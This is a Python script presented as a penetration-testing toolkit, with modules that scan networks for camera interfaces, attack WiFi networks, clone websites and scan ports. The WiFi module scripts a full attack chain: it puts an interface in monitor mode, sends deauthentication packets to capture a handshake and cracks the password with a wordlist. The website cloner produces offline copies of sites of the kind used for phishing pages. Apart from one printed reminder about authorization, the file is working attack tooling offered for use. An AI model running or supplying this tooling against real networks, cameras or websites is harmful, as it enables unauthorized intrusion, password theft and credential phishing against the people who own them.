#!/usr/bin/env python3
# Kali Penetration Testing Toolkit (KPT) [ALTERNATIVE NMAP HACKING]
# Author: ALLENDRAA A/L ANBALAGAN
# Version: 1.0
# License: MIT

import os
import sys
import socket
import subprocess
import requests
from bs4 import BeautifulSoup
import nmap
import pyfiglet
from colorama import Fore, Style
import time
import argparse

# Banner
def display_banner():
    banner = pyfiglet.figlet_format("KPT Toolkit", font="slant")
    print(Fore.RED + banner)
    print(Fore.GREEN + "\t\tKali Penetration Testing Toolkit")
    print(Fore.YELLOW + "\t\t  Author: [Your Name]")
    print(Fore.BLUE + "\t\t  Version: 1.0")
    print(Style.RESET_ALL + "="*80)

# Camera Scanner Module
def camera_scanner(target_ip, output_file=None):
    print(Fore.CYAN + f"\n[+] Scanning for cameras on {target_ip}..." + Style.RESET_ALL)
    
    common_ports = [80, 8080, 554, 37777]  # Common camera ports
    camera_urls = []
    
    nm = nmap.PortScanner()
    nm.scan(target_ip, ','.join(str(p) for p in common_ports))
    
    for host in nm.all_hosts():
        print(f"\nHost: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            print("\nProtocol:", proto)
            ports = nm[host][proto].keys()
            
            for port in sorted(ports):
                print(f"Port: {port}\tState: {nm[host][proto][port]['state']}")
                
                if nm[host][proto][port]['state'] == 'open':
                    url = f"http://{host}:{port}"
                    try:
                        response = requests.get(url, timeout=5)
                        if response.status_code == 200:
                            print(Fore.GREEN + f"[+] Potential camera interface found at {url}" + Style.RESET_ALL)
                            camera_urls.append(url)
                            
                            # Check for common camera brands
                            if "dvr" in response.text.lower() or "camera" in response.text.lower():
                                print(Fore.YELLOW + "[!] Possible DVR/Camera system detected" + Style.RESET_ALL)
                    except:
                        continue
    
    if output_file:
        with open(output_file, 'w') as f:
            for url in camera_urls:
                f.write(url + '\n')
        print(Fore.GREEN + f"\n[+] Results saved to {output_file}" + Style.RESET_ALL)
    
    return camera_urls

# WiFi Penetration Module
def wifi_penetrator(interface, wordlist, target_ssid=None):
    print(Fore.CYAN + "\n[+] Starting WiFi penetration tools..." + Style.RESET_ALL)
    
    if not os.path.exists(wordlist):
        print(Fore.RED + "[-] Wordlist file not found!" + Style.RESET_ALL)
        return
    
    # Put interface in monitor mode
    try:
        print(Fore.YELLOW + "[*] Setting interface to monitor mode..." + Style.RESET_ALL)
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Error setting monitor mode: {e}" + Style.RESET_ALL)
        return
    
    # Scan for networks
    try:
        print(Fore.YELLOW + "[*] Scanning for nearby networks..." + Style.RESET_ALL)
        scan_result = subprocess.run(['airodump-ng', interface], capture_output=True, text=True, timeout=60)
        print(scan_result.stdout)
    except subprocess.TimeoutExpired:
        print(Fore.YELLOW + "[*] Scan completed." + Style.RESET_ALL)
    
    if target_ssid:
        print(Fore.CYAN + f"\n[+] Targeting SSID: {target_ssid}" + Style.RESET_ALL)
        try:
            # Start capturing handshake
            print(Fore.YELLOW + "[*] Capturing handshake (press Ctrl+C when done)..." + Style.RESET_ALL)
            cap_file = f"capture_{target_ssid.replace(' ', '_')}"
            subprocess.Popen(['airodump-ng', '--bssid', target_ssid, '-w', cap_file, interface])
            
            # Deauth attack to capture handshake
            time.sleep(5)
            subprocess.run(['aireplay-ng', '--deauth', '5', '-a', target_ssid, interface])
            
            # Crack with aircrack
            print(Fore.YELLOW + "[*] Attempting to crack handshake..." + Style.RESET_ALL)
            crack_result = subprocess.run(['aircrack-ng', '-w', wordlist, f'{cap_file}-01.cap'], 
                                         capture_output=True, text=True)
            print(crack_result.stdout)
            
            if "KEY FOUND" in crack_result.stdout:
                print(Fore.GREEN + "[+] Password found!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[-] Password not found in wordlist" + Style.RESET_ALL)
                
        except Exception as e:
            print(Fore.RED + f"[-] Error during attack: {e}" + Style.RESET_ALL)
    
    # Clean up
    try:
        subprocess.run(['airmon-ng', 'stop', interface], check=True)
        subprocess.run(['service', 'network-manager', 'start'], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Error cleaning up: {e}" + Style.RESET_ALL)

# Website Cloner Module
def website_cloner(target_url, output_dir="cloned_site"):
    print(Fore.CYAN + f"\n[+] Cloning website: {target_url}" + Style.RESET_ALL)
    
    try:
        os.makedirs(output_dir, exist_ok=True)
        
        # Get main page
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Save main page
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(response.text)
        
        # Find and download resources
        resource_tags = {'img': 'src', 'link': 'href', 'script': 'src'}
        downloaded_resources = set()
        
        for tag, attr in resource_tags.items():
            for element in soup.find_all(tag):
                resource_url = element.get(attr)
                if resource_url and not resource_url.startswith(('http', '//')):
                    if not resource_url.startswith('/'):
                        resource_url = f"/{resource_url}"
                    absolute_url = f"{target_url}{resource_url}"
                    
                    if absolute_url not in downloaded_resources:
                        downloaded_resources.add(absolute_url)
                        try:
                            resource_data = requests.get(absolute_url)
                            local_path = f"{output_dir}/{resource_url.replace('/', '_')}"
                            
                            with open(local_path, 'wb') as f:
                                f.write(resource_data.content)
                            
                            # Update HTML to point to local resource
                            element[attr] = local_path.split('/')[-1]
                        except:
                            continue
        
        # Save modified HTML
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(str(soup))
        
        print(Fore.GREEN + f"[+] Website cloned successfully to {output_dir}/" + Style.RESET_ALL)
        print(Fore.YELLOW + "[!] Remember: Use this only for legitimate penetration testing with proper authorization" + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[-] Error cloning website: {e}" + Style.RESET_ALL)

# Port Scanner Module
def port_scanner(target_ip, ports="1-1000", output_file=None):
    print(Fore.CYAN + f"\n[+] Scanning ports {ports} on {target_ip}..." + Style.RESET_ALL)
    
    nm = nmap.PortScanner()
    nm.scan(target_ip, ports)
    
    open_ports = []
    
    for host in nm.all_hosts():
        print(f"\nHost: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            print("\nProtocol:", proto)
            ports = nm[host][proto].keys()
            
            for port in sorted(ports):
                state = nm[host][proto][port]['state']
                service = nm[host][proto][port]['name']
                print(f"Port: {port}\tState: {state}\tService: {service}")
                
                if state == 'open':
                    open_ports.append((port, proto, service))
    
    if output_file:
        with open(output_file, 'w') as f:
            f.write(f"Port scan results for {target_ip}\n")
            f.write("="*50 + "\n")
            for port, proto, service in open_ports:
                f.write(f"Port: {port}/{proto}\tService: {service}\n")
        print(Fore.GREEN + f"\n[+] Results saved to {output_file}" + Style.RESET_ALL)
    
    return open_ports

# Main function
def main():
    display_banner()
    
    parser = argparse.ArgumentParser(description="Kali Penetration Testing Toolkit")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Camera scanner arguments
    cam_parser = subparsers.add_parser('camscan', help='Scan for vulnerable cameras')
    cam_parser.add_argument('target', help='Target IP or IP range')
    cam_parser.add_argument('-o', '--output', help='Output file to save results')
    
    # WiFi penetrator arguments
    wifi_parser = subparsers.add_parser('wifipen', help='WiFi penetration tools')
    wifi_parser.add_argument('interface', help='Wireless interface to use')
    wifi_parser.add_argument('wordlist', help='Path to password wordlist')
    wifi_parser.add_argument('-t', '--target', help='Specific SSID to target')
    
    # Website cloner arguments
    clone_parser = subparsers.add_parser('clone', help='Clone a website')
    clone_parser.add_argument('url', help='URL of website to clone')
    clone_parser.add_argument('-o', '--output', help='Output directory', default="cloned_site")
    
    # Port scanner arguments
    port_parser = subparsers.add_parser('portscan', help='Scan for open ports')
    port_parser.add_argument('target', help='Target IP to scan')
    port_parser.add_argument('-p', '--ports', help='Port range to scan', default="1-1000")
    port_parser.add_argument('-o', '--output', help='Output file to save results')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'camscan':
        camera_scanner(args.target, args.output)
    elif args.command == 'wifipen':
        wifi_penetrator(args.interface, args.wordlist, args.target)
    elif args.command == 'clone':
        website_cloner(args.url, args.output)
    elif args.command == 'portscan':
        port_scanner(args.target, args.ports, args.output)
    else:
        parser.print_help()

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(Fore.RED + "[-] This tool requires root privileges. Please run with sudo." + Style.RESET_ALL)
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Operation cancelled by user" + Style.RESET_ALL)
        sys.exit(0)
